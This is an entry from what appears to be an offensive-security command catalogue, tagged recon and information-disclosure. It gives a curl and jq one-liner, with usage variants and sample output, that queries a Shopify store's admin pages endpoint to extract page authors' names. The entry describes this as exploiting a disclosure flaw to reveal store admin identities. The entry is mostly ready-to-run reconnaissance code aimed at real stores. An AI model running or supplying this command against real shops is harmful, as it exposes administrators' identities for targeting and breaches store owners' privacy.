---
data: >-
  curl -s "https://target-store.myshopify.com/admin/api/pages.json" | jq
  '.pages[] | {title: .title, author: {first_name: .author.first_name,
  last_name: .author.last_name}}'
tags:
  - recon
  - api
  - information-disclosure
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: f6540324-9e76-43ae-822c-a3cbb302da5a
created_at: '2025-12-14T17:28:44.645Z'
updated_at: '2025-12-14T17:28:44.645Z'
verified: false
validated: true
submitted: true
---
# curl-shopify-page-query

## Command

```bash
curl -s "https://target-store.myshopify.com/admin/api/pages.json" | jq '.pages[] | {title: .title, author: {first_name: .author.first_name, last_name: .author.last_name}}'
```

## Description

This command queries the Shopify public API for page data and parses the JSON response to extract page titles and author names, exploiting the information disclosure vulnerability to reveal store admin identities.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Silent mode to suppress progress meter | Yes |
| URL argument | Target Shopify store API endpoint (replace target-store.myshopify.com) | Yes |
| jq filter | JSON parsing to select title and author fields | Yes |

## Examples

### Basic Usage

```bash
curl -s "https://example-shop.myshopify.com/admin/api/pages.json" | jq '.pages[] | select(.author != null) | .author'
```

### Advanced Usage

```bash
curl -s "https://target-store.myshopify.com/admin/api/pages.json?limit=50" | jq '.pages | map({title, author_first: .author.first_name, author_last: .author.last_name})'
```

## Expected Output

JSON array showing page details with author names, e.g., [
  {
    "title": "Contact",
    "author": {
      "first_name": "John",
      "last_name": "Doe"
    }
  }
]. If no author field, output will be empty or null for those keys.

## Related

- [[Related Procedure|procedures/Query-Shopify-Public-API-for-Author-Disclosure]]
